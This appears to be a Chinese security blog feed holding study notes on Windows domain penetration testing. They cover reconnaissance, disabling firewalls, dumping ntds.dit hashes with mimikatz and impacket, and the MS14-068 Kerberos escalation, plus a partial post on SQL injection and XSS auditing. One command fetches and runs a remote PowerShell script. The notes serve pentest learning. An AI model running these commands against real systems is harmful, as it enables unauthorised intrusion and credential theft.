<pre><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></pre><hr>
<h4 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h4><pre><code>wmic service list brief</code></pre><hr>
<h4 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h4><pre><code>tasklist</code></pre><p>查询进程信息</p>
<pre><code>wmic process list brief</code></pre><hr>
<h4 id="查看启动程序信息"><a href="#查看启动程序信息" class="headerlink" title="查看启动程序信息"></a>查看启动程序信息</h4><pre><code>wmic startup get command,caption</code></pre><hr>
<h4 id="执行计划任务"><a href="#执行计划任务" class="headerlink" title="执行计划任务"></a>执行计划任务</h4><pre><code>schtasks /query /fo LIST /v</code></pre><hr>
<h4 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h4><pre><code>net statistics workstation</code></pre><hr>
<h4 id="查看用户列表"><a href="#查看用户列表" class="headerlink" title="查看用户列表"></a>查看用户列表</h4><pre><code>net user</code></pre><p>获取域管信息</p>
<pre><code>net localgroup administrators</code></pre><p>查看当前在线用户</p>
<pre><code>query user || qwinsta</code></pre><hr>
<h4 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h4><pre><code>net session</code></pre><hr>
<h4 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h4><pre><code>netstat -ano</code></pre><hr>
<h4 id="查看补丁列表"><a href="#查看补丁列表" class="headerlink" title="查看补丁列表"></a>查看补丁列表</h4><pre><code>systeminfo</code></pre><p>wmic:</p>
<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><hr>
<h4 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h4><pre><code>net share</code></pre><p>wmic:</p>
<pre><code>wmic share get name,path,status</code></pre><hr>
<h4 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h4><pre><code>route print
arp -a</code></pre><hr>
<h4 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h4><p>1.关闭防火墙</p>
<pre><code>netsh firewall set opmode disable //windows server 2003及之前版本</code></pre><pre><code>netsh advfirewall set allprofiles state off //windows server 2003以后版本</code></pre><p>2.查看防火墙配置</p>
<pre><code>netsh firewall show config</code></pre><p>3.修改防火墙配置</p>
<p>windows server 2003及之前版本</p>
<pre><code>netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable  //windows server 2003及之前版本

</code></pre><p>windows server 2003以后</p>
<p>允许指定程序进入</p>
<pre><code>netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;c: \nc.exe&quot;</code></pre><p>允许指定程序退出</p>
<pre><code>netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;c: \nc.exe&quot;</code></pre><p>允许3389端口放行</p>
<pre><code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><p>自定义防火墙日志的储存位置</p>
<pre><code>netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></pre><hr>
<h4 id="查看代理配置情况"><a href="#查看代理配置情况" class="headerlink" title="查看代理配置情况"></a>查看代理配置情况</h4><pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><hr>
<h4 id="查看并开启远程连接服务"><a href="#查看并开启远程连接服务" class="headerlink" title="查看并开启远程连接服务"></a>查看并开启远程连接服务</h4><p>查看远程连接端口</p>
<pre><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></pre><p>在windows server 2003 开启3389端口</p>
<pre><code>wmic path win32_terminalservicesetting where (__CLASS !==&quot;&quot;) call setallowtsconnections 1</code></pre><p>在windows server 2008和2012中开启3389端口</p>
<pre><code>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</code></pre><pre><code>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</code></pre><pre><code>reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre><hr>
<h4 id="查询权限"><a href="#查询权限" class="headerlink" title="查询权限"></a>查询权限</h4><ol>
<li>查看当前权限</li>
</ol>
<pre><code>whoami</code></pre><ol start="2">
<li>获取域SID</li>
</ol>
<pre><code>whoami /all</code></pre><ol start="3">
<li>查询指定用户的详细信息</li>
</ol>
<pre><code>net user xxx /domain</code></pre><hr>
<h4 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h4><ol>
<li>使用ipconfig查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器在同一个网段</li>
</ol>
<pre><code>ipconfig /all</code></pre><p>​       通过反向nslookup来解析域名的ip地址，判断域控是否和DNS服务器在同一服务器</p>
<pre><code>nslookup hacke.testlab</code></pre><ol start="2">
<li>查看系统详细信息</li>
</ol>
<pre><code>systeminfo</code></pre><ol start="3">
<li>查询当前登录域及登录用户信息</li>
</ol>
<pre><code>net config workstation</code></pre><ol start="4">
<li>判断主域</li>
</ol>
<pre><code>net time /domain</code></pre><p>​       有三种情况：</p>
<p>(1)若提示发生系统错误5，拒绝访问      —–存在域，但当前用户不是域用户</p>
<p>(2)若成功显示时间                                   —–存在域，且当前用户是域用户</p>
<p>(3)当前网络环境为工作组                       —–当前网络环境为工作组，不存在域</p>
<hr>
<h4 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h4><ol>
<li>利用NetBIOS</li>
</ol>
<p>NetBIOS是局域网程序使用的一种应用程序编程接口（API），为程序提供了请求低级别服务的统一的命令集。</p>
<p>使用工具nbtscan</p>
<blockquote>
<p>nbtscan体积小，支持windows和linux，不需要安装其他库或dll</p>
</blockquote>
<p>使用命令：</p>
<pre><code>nbt.exe 192.168.1.0/20</code></pre><blockquote>
<p>显示列表第一列为IP地址，第二列为机器名和域所在的名称，最后一列是机器所开启的服务列表</p>
</blockquote>
<ol start="2">
<li>利用ICMP</li>
</ol>
<p>原理：对内网中每个IP地址执行ping命令</p>
<pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></pre><ol start="3">
<li>通过ARP</li>
</ol>
<p>使用工具arp-scan</p>
<pre><code>arp.exe -t 192.168.1.0/20</code></pre><p>Empire中的arpscan模块</p>
<p>Nishang中的Invoke-ARPScan.ps1</p>
<pre><code>powershell.exe -exec bypass -Command &quot;&amp; {Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20}&quot; &gt;&gt; C:\windows\temp\log.txt</code></pre><blockquote>
<p>可将脚本上传到目标主机运行，也可以直接远程加载脚本、自定义掩码和扫描范围</p>
</blockquote>
<ol start="4">
<li>通过常规的TCP/UDP端口 </li>
</ol>
<p>使用ScanLine端口扫描工具</p>
<pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b</code></pre><hr>
<h4 id="扫描内网域内端口"><a href="#扫描内网域内端口" class="headerlink" title="扫描内网域内端口"></a>扫描内网域内端口</h4><ul>
<li>端口的banner信息</li>
<li>端口上运行的服务</li>
<li>常见应用的默认端口</li>
</ul>
<ol>
<li>利用telnet命令</li>
</ol>
<pre><code>telnet DC 22</code></pre><ol start="2">
<li>S扫描器</li>
</ol>
<pre><code>S.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</code></pre><ol start="3">
<li>Metasploit扫描</li>
</ol>
<p>使用<strong>auxiliary/scanner/portscan/tcp</strong>模块进行扫描</p>
<ol start="4">
<li>PowerSploit的Invoke-portscan.ps1脚本</li>
</ol>
<pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA c:\windows\temp\res.txt&quot;</code></pre><ol start="5">
<li>Nishang的Invoke-Portscan模块</li>
</ol>
<pre><code>Invoke-Portscan -ScanPort -StartAddress 192.168.1.1 -EndAddress 192.168.1.1255 -ResolveHost</code></pre><hr>
<h4 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h4><p>确定了当前内网拥有的域，且所控制的主机在域内，就能进行域内相关的信息收集了。</p>
<blockquote>
<p>通过LDAP协议到域控查询，所以查询的时候需要进行权限认证，只有域内用户拥有此权限</p>
</blockquote>
<ol>
<li>查询域</li>
</ol>
<pre><code>net view /domain</code></pre><ol start="2">
<li>查询域内所有计算机</li>
</ol>
<pre><code>net view /domain:域的名字</code></pre><ol start="3">
<li>查询域内所有用户组列表</li>
</ol>
<pre><code>net group /domain</code></pre><ol start="4">
<li>查询所有域成员计算机列表</li>
</ol>
<pre><code>net group &quot;domain computers&quot; /domain</code></pre><ol start="5">
<li>获取域密码信息</li>
</ol>
<pre><code>net accounts /domain</code></pre><ol start="6">
<li>获取域信任信息</li>
</ol>
<pre><code>nltest /domain_trusts</code></pre><hr>
<h4 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h4><ol>
<li>查看域控制器的机器名</li>
</ol>
<pre><code>nltest /DCLIST:域名字</code></pre><ol start="2">
<li>查看域控制器的主机名</li>
</ol>
<pre><code>Nslookup -type=SRV_ldap._tcp</code></pre><ol start="3">
<li>查看当前时间</li>
</ol>
<pre><code>net time /domain</code></pre><ol start="4">
<li>查看域控制器组</li>
</ol>
<pre><code>net group &quot;Domain Controllers&quot; /domain</code></pre><hr>
<h4 id="获取域内的用户信息"><a href="#获取域内的用户信息" class="headerlink" title="获取域内的用户信息"></a>获取域内的用户信息</h4><ol>
<li>向域控制器进行查询</li>
</ol>
<pre><code>net user /domain</code></pre><blockquote>
<p>执行命令，向域控DC进行查询。注意krbtgt用户不仅可以创建票据授权服务（TGS）的加密密钥，还可以实现多种域内权限持久化方法</p>
</blockquote>
<ol start="2">
<li>获取域内用户的详细信息</li>
</ol>
<pre><code>wmic useraccount get /all</code></pre><ol start="3">
<li>查看存在的用户</li>
</ol>
<pre><code>dsquery user</code></pre><ol start="4">
<li>查询本地管理员组用户</li>
</ol>
<pre><code>net localgroup administors</code></pre><blockquote>
<p>Domain Admins 组中的用户默认为域内机器的本地管理员用户。</p>
</blockquote>
<hr>
<h4 id="获取域内管理员信息"><a href="#获取域内管理员信息" class="headerlink" title="获取域内管理员信息"></a>获取域内管理员信息</h4><ol>
<li>查询域管理员用户</li>
</ol>
<pre><code>net group &quot;domain admins&quot; /domain</code></pre><ol start="2">
<li>查询管理员用户组</li>
</ol>
<pre><code>net group &quot;Enterprise Admins&quot; /domain</code></pre><hr>
<h4 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h4><p>内网渗透的需求是获取内网中特定用户或机器的权限，进而获取特定的资源</p>
<ol>
<li>域管理员定位</li>
</ol>
<p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限。</p>
<blockquote>
<p>当计算机被添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，且具备完全控制权限。</p>
</blockquote>
<p>定位域内管理员的途径：(1) 日志  (2) 绘画</p>
<ol start="2">
<li>定位域管理员的工具</li>
</ol>
<p>psloggedon.exe</p>
<pre><code>psloggedon.exe \\computername或username</code></pre><blockquote>
<p>该工具可查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户</p>
</blockquote>
<p>PVEFindADUser.exe</p>
<pre><code>PVEFindADUser.exe &lt;参数&gt;
- current[&quot;username&quot;] : 获取当前登录用户名
- last[&quot;userename&quot;] : 获取最后一个登录的用户名</code></pre><blockquote>
<p>可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户。</p>
</blockquote>
<p>netview.exe</p>
<pre><code>netview.exe &lt;参数&gt;
-f filename.txt : 指定要提取主机列表的文件
-e filename.txt : 指定要排除主机列表的文件
-o filename.txt : 将所有输出重定向到指定文件
-d domain : 指定要提取主机列表的域
-g group : 指定搜索的组名
-c : 对已找到的共享目录/文件的访问权限进行检查</code></pre><blockquote>
<p>枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户。同时，netview.exe能够查询共享入口和有价值的用户</p>
</blockquote>
<p>Nmap的NSE脚本</p>
<p>如果存在域账户或者本地账户，就可以使用Nmap的smb-enum-sessions.nse引擎获取远程主机的登录会话</p>
<p>PowerView脚本</p>
<pre><code>powershell.exe -exec bypass -Command &quot;&amp; &lt;Import-Module C:\PowerView.ps1; Invoke-UserHunter&gt;&quot;</code></pre><ul>
<li>Invoke-StealthUserHunter: 只需进行一次查询，就可以获取域里面的所有用户。</li>
<li>Invoke-UserHunter：找到域内特定的用户群，接收用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名 。</li>
</ul>
<p>Empire的user_hunter模块</p>
<p>使用usemodule situational_awareness/network/powerview/user_hunter模块</p>
<hr>
<h4 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h4><p><strong>本机检查</strong></p>
<ol>
<li>获取域管理员列表</li>
</ol>
<pre><code>net group &quot;Domain Admins&quot; /domain</code></pre><ol start="2">
<li>列出本机的所有进程及进程用户</li>
</ol>
<pre><code>tasklist /v</code></pre><ol start="3">
<li>寻找进程所有者为管理员的进程</li>
</ol>
<p><strong>查询域控制器的域用户会话</strong></p>
<ol>
<li>查询域控制器列表</li>
</ol>
<pre><code>net group &quot;Domain Controllers&quot; /domain</code></pre><ol start="2">
<li>收集域管理员列表</li>
</ol>
<pre><code>net group &quot;Domain Admins&quot; /domain</code></pre><ol start="3">
<li>收集所有活动域的会话列表</li>
</ol>
<pre><code>NetSess -h</code></pre><ol start="4">
<li>交叉引用域管理员列表与活动会话列表</li>
</ol>
<pre><code>FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</code></pre><p><strong>查询远程系统中运行的任务</strong></p>
<ol>
<li>收集域管理员列表</li>
<li>运行下面脚本，将目标域系统列表添加到ips.txt中，将收集到的域管列表添加到names.txt文件中。</li>
</ol>
<pre><code>FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /v /s %i /u user /p password 2&gt;nul &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; nul &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><p><strong>扫描远程系统的NetBIOS信息</strong></p>
<pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;nul &gt;nbsessions.txt &amp;&amp; for /f %n in (admins.txt) do @type nbsessions.txt | findstr /I %n &gt; nul &amp;&amp; echo [!] %n was found logged into %i</code></pre><hr>
<h4 id="Powershell-收集域信息"><a href="#Powershell-收集域信息" class="headerlink" title="Powershell 收集域信息"></a>Powershell 收集域信息</h4><p>Powershell权限：</p>
<ul>
<li>Restricted: 默认设置，不允许执行任何脚本</li>
<li>Allsigned: 只能运行经过证书验证的脚本</li>
<li>Unrestricted: 权限最高，可以执行任意脚本</li>
<li>RemoteSigned: 对本地脚本不进行限制；对来自网络的脚本必须验证其签名</li>
</ul>
<p>获取权限信息：</p>
<pre><code>Get-ExecutionPolicy</code></pre><p>更改权限：</p>
<pre><code>Set-ExecutionPolicy 权限名</code></pre><p>Powershell渗透脚本：Powerview</p>
<hr>
<hr>
<p>参考：内网安全攻防渗透测试实战指南</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>红队攻防</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>红队攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习（五）</title>
    <url>/2021/02/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    <content><![CDATA[<h2 id="内网渗透学习（五）"><a href="#内网渗透学习（五）" class="headerlink" title="内网渗透学习（五）"></a>内网渗透学习（五）</h2><h3 id="使用卷影拷贝服务提取ntds-dit"><a href="#使用卷影拷贝服务提取ntds-dit" class="headerlink" title="使用卷影拷贝服务提取ntds.dit"></a>使用卷影拷贝服务提取ntds.dit</h3><p>在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，存储位置是域控的<code>%SystemRoot%\ntds\ntds.dit</code>。和SAM文件一样被Windows操作系统锁定</p>
<p>卷影拷贝服务(Volume Shadow Copy Service)，属于快照技术的一种，主要用于备份和恢复</p>
<hr>
<h3 id="通过ntdsutil-exe提取ntds-dit"><a href="#通过ntdsutil-exe提取ntds-dit" class="headerlink" title="通过ntdsutil.exe提取ntds.dit"></a>通过ntdsutil.exe提取ntds.dit</h3><h4 id="通过ntdsutil提取ntds-dit"><a href="#通过ntdsutil提取ntds-dit" class="headerlink" title="通过ntdsutil提取ntds.dit"></a>通过ntdsutil提取ntds.dit</h4><p>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。支持的操作系统有Windows Server 2003、Windows Server 2008、Windows Server 2012</p>
<ol>
<li><p>创建快照</p>
<pre class=" language-bash"><code class="language-bash">ntdsutil snapshot <span class="token string">"active instance ntds"</span> create quit quit</code></pre>
</li>
<li><p>加载快照</p>
<pre class=" language-bash"><code class="language-bash">ntdsutil snapshot <span class="token string">"mount {GUID}"</span> quit quit</code></pre>
</li>
<li><p>复制快照中文件</p>
<pre class=" language-bash"><code class="language-bash">copy C:\<span class="token variable">$SNAP_20180813112_VOLUMEC</span>$\windows\ntds\ntds.dit c:\temp\ntds.dit</code></pre>
</li>
<li><p>卸载删除快照</p>
<pre class=" language-bash"><code class="language-bash">ntdsutil snapshot <span class="token string">"unmount {GUID}"</span> <span class="token string">"delete {GUID}"</span> quit quit</code></pre>
</li>
</ol>
<h4 id="利用vssadmin提取ntds-dit"><a href="#利用vssadmin提取ntds-dit" class="headerlink" title="利用vssadmin提取ntds.dit"></a>利用vssadmin提取ntds.dit</h4><p>创建卷影拷贝</p>
<pre class=" language-bash"><code class="language-bash">vssadmin create shadow /for<span class="token operator">=</span>c:</code></pre>
<p>在创建的卷影拷贝中将ntds.dit复制出来</p>
<pre class=" language-bash"><code class="language-bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds.dit</code></pre>
<p>删除快照</p>
<pre><code>vssadmin delete shadow /for=c: /quiet</code></pre><h4 id="利用vssown-vbs脚本提取ntds-dit"><a href="#利用vssown-vbs脚本提取ntds-dit" class="headerlink" title="利用vssown.vbs脚本提取ntds.dit"></a>利用vssown.vbs脚本提取ntds.dit</h4><p>启动卷影拷贝服务</p>
<pre class=" language-bash"><code class="language-bash">cscript vssown.vbs /start</code></pre>
<p>创建一个C盘的卷影拷贝</p>
<pre><code>script vssown.vbs /create c</code></pre><p>列出当前拷贝</p>
<pre><code>csript vssown.vbs /list</code></pre><p>复制ntds.dit</p>
<pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\NTDS\ntds.dit c:\ntds.dit</code></pre><p>删除卷影拷贝</p>
<pre><code>cscript vssown.vbs /delete {GUID}</code></pre><h4 id="使用ntdsutil的IFM创建卷影拷贝"><a href="#使用ntdsutil的IFM创建卷影拷贝" class="headerlink" title="使用ntdsutil的IFM创建卷影拷贝"></a>使用ntdsutil的IFM创建卷影拷贝</h4><pre><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</code></pre><p>将ntds.dit复制到c:\test\Active Directory\文件夹下</p>
<p>将SYSTEM和SECURITY 复制到c:\test\registry\文件夹下</p>
<p>将ntds.dit拖回本地后，在目标机器上将test文件删除</p>
<pre><code>rmdir /s/q test</code></pre><p>通过Copy-VSS.ps1脚本，将SAM、SYSTEM、ntds.dit复制到与该脚本相同目录</p>
<pre><code>import-module .\Copy-VSS.ps1
Copy-vss</code></pre><h4 id="使用diskshadow导出ntds-dit"><a href="#使用diskshadow导出ntds-dit" class="headerlink" title="使用diskshadow导出ntds.dit"></a>使用diskshadow导出ntds.dit</h4><p>将如下命令写入command.txt</p>
<pre><code>//设置卷影拷贝
set context persistent nowriters
//添加卷
add volume c: alias someAlias
//创建快照
create
//分配虚拟磁盘盘符
expose %someAlias% k:
//将ntds.dit复制到C盘中
exec &quot;cmd.exe&quot; /c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit
//删除所有快照
delete shadow all
//列出系统中的卷影拷贝
list shadow all
//重置
reset
//推出
exit</code></pre><p>接着diskshadow.exe直接加载这个文本文件</p>
<pre><code>diskshadow /s c:\command.txt</code></pre><hr>
<h3 id="导出ntds-dit中的散列值"><a href="#导出ntds-dit中的散列值" class="headerlink" title="导出ntds.dit中的散列值"></a>导出ntds.dit中的散列值</h3><h4 id="使用esedbexport恢复ntds-dit"><a href="#使用esedbexport恢复ntds-dit" class="headerlink" title="使用esedbexport恢复ntds.dit"></a>使用esedbexport恢复ntds.dit</h4><p>提取表信息</p>
<pre><code>esedbexport -m tables ntds.dit</code></pre><p>使用ntdsxtract导出散列值</p>
<pre><code>//将导出的ntds.dit.export文件夹和SYSTEM文件一并放入ntdsxtract文件夹
dsusers.py ntds.dit.export/database.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tree all_user.txt</code></pre><p>导出域内所有计算机信息</p>
<pre><code>dscomputers.py ntds.dit.export/database.3 computer_output --csvoutfile all_computers.csv</code></pre><h4 id="使用impack工具包导出散列值"><a href="#使用impack工具包导出散列值" class="headerlink" title="使用impack工具包导出散列值"></a>使用impack工具包导出散列值</h4><pre><code>impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</code></pre><hr>
<h3 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h3><ol>
<li><p>使用mimikatz转储域散列值</p>
<p>mimikatz有一个dcsync功能，可以利用卷影拷贝服务直接读取ntds.dit文件并检索域散列值</p>
<p>以域管权限打开命令行运行mimikatz，导出域内所有用户名及散列值</p>
<pre><code>lsadump::dcsync /domain:pentest.com /all /csv</code></pre></li>
<li><p>Invoke-DCSync -PWDumpFormat </p>
</li>
</ol>
<hr>
<h3 id="使用Metasploit获取域散列值"><a href="#使用Metasploit获取域散列值" class="headerlink" title="使用Metasploit获取域散列值"></a>使用Metasploit获取域散列值</h3><ol>
<li>psexec_ntdsgrab模块使用</li>
<li>基于meterpreter会话获取域账号和域散列值</li>
</ol>
<hr>
<h3 id="使用vshadow-exe-和QuarksPwDump-exe导出域账号和域散列值"><a href="#使用vshadow-exe-和QuarksPwDump-exe导出域账号和域散列值" class="headerlink" title="使用vshadow.exe.和QuarksPwDump.exe导出域账号和域散列值"></a>使用vshadow.exe.和QuarksPwDump.exe导出域账号和域散列值</h3><hr>
<h3 id="Kerberos域用户提权漏洞"><a href="#Kerberos域用户提权漏洞" class="headerlink" title="Kerberos域用户提权漏洞"></a>Kerberos域用户提权漏洞</h3><p>Kerberos域用户提权漏洞（MS14-068; CVE-2014-6324）。影响范围：Windows所有服务器操作系统。该漏洞可导致活动目录整体权限控制受到影响，允许攻击者将域内任意用户权限提升至域管理级别。</p>
<p>原理：用户在向KDC申请TGT时，可伪造自己的Kerberos票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么返回给用户的TGT就使普通域用户拥有了域管理员权限。</p>
<h4 id="PyKEK工具包"><a href="#PyKEK工具包" class="headerlink" title="PyKEK工具包"></a>PyKEK工具包</h4><p>PyKEK是一个利用Kerberos协议进行渗透测试的工具包，使用PyKEK可以生成一个高权限的服务票据。</p>
<p>查看补丁情况</p>
<pre><code>// MS14-068的补丁为 KB3011780
wmic qfe get hotfixid</code></pre><p>查看用户的SID</p>
<pre><code>whoami /user</code></pre><p>生成高权限票据</p>
<pre><code>python ms14-068.py -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</code></pre><p>用mimikatz将高权限票据注入内存</p>
<pre><code>mimikatz&gt; kerberos::purge
mimikatz&gt; kerberos::ptc &quot;TGT_user1@pentest.com.ccache&quot;</code></pre><h4 id="goldenPac-py"><a href="#goldenPac-py" class="headerlink" title="goldenPac.py"></a>goldenPac.py</h4><h4 id="Metasploit的MS14-068利用脚本"><a href="#Metasploit的MS14-068利用脚本" class="headerlink" title="Metasploit的MS14-068利用脚本"></a>Metasploit的MS14-068利用脚本</h4><pre><code>use auxiliary/admin/kerberos/ms14-068_kerberos_checksum</code></pre><hr>
<p>参考：内网安全攻防渗透测试实战指南</p>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>红队攻防</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>红队攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计学习（二）</title>
    <url>/2019/11/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="代码审计学习（二）"><a href="#代码审计学习（二）" class="headerlink" title="代码审计学习（二）"></a>代码审计学习（二）</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><font color="green">SQL注入</font></h3><ul>
<li><strong>由于开发者在编写数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过任何过滤就直接放入数据库引擎执行</strong></li>
</ul>
<a id="more"></a>

<hr>
<h4 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h4><ul>
<li>在<strong>参数处</strong>利用select、union等构造sql注入语句。主要分为<strong>int型</strong>和<strong>string型注入</strong></li>
</ul>
<pre><code>string型注入中需要用单或双引号闭合</code></pre><ul>
<li><strong>关键函数</strong><pre><code>select、mysql_connect、mysql_query、mysql_fetch_now
update 、insert、 delete等</code></pre></li>
</ul>
<hr>
<h4 id="编码注入"><a href="#编码注入" class="headerlink" title="编码注入"></a>编码注入</h4><p><font color="purple"><strong>1. 宽字节注入</strong></font></p>
<ul>
<li>漏洞产生原因：<br>```</li>
</ul>
<ol>
<li>set character_set_client = ‘gbk’</li>
<li>SET NAMES ‘gbk’<br>```</li>
</ol>
<ul>
<li>漏洞利用：<strong>当注入参数里带入%df%27，即可把过滤的(\)%5c吃掉</strong></li>
</ul>
<blockquote>
<p>%df%5c -&gt; 運</p>
</blockquote>
<ul>
<li>合理使用mysql_real_escape_string可解决这个漏洞</li>
</ul>
<ul>
<li>关键函数：<pre><code>SET NAMES
character_set_clint=gbk
mysql_set_charset(&#39;gbk&#39;)</code></pre></li>
</ul>
<hr>
<p><font color="purple"><strong>2. 二次urldecode注入</strong></font></p>
<ul>
<li><p>漏洞原因：当提交参数到web服务器时，<strong>会先自动解码一次</strong>。若<font color="red">程序里</font>使用了<strong>urldecode或者rawurldecode函数</strong>来解码参数，则会出现二次注入漏洞</p>
</li>
<li><p>漏洞利用：参数里带入%2527</p>
</li>
</ul>
<blockquote>
<p>%2527 二次解码后-&gt; ‘</p>
</blockquote>
<ul>
<li>关键函数：</li>
</ul>
<pre><code>urldecode
rawurldecode</code></pre><hr>
<h4 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h4><p><strong>1. magic_quotes_gpc/runtime魔术引导</strong></p>
<p><strong>2. 过滤函数和类</strong></p>
<pre><code>addslashes()
mysql_escape_string() / mysql_real_escape_string()
intval()</code></pre><p><strong>3. PDO prepare 预编译</strong></p>
<hr>
<h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a><font color="green">XSS漏洞</font></h3><ul>
<li><strong>通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序</strong></li>
</ul>
<hr>
<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><ul>
<li>定义：<strong>直接通过外部输入然后在浏览器输出端触发</strong></li>
</ul>
<pre><code>在白盒审计中，只需要寻找带有参数的输出函数
然后根据输出函数内容回溯输入参数，观察是否有过滤</code></pre><hr>
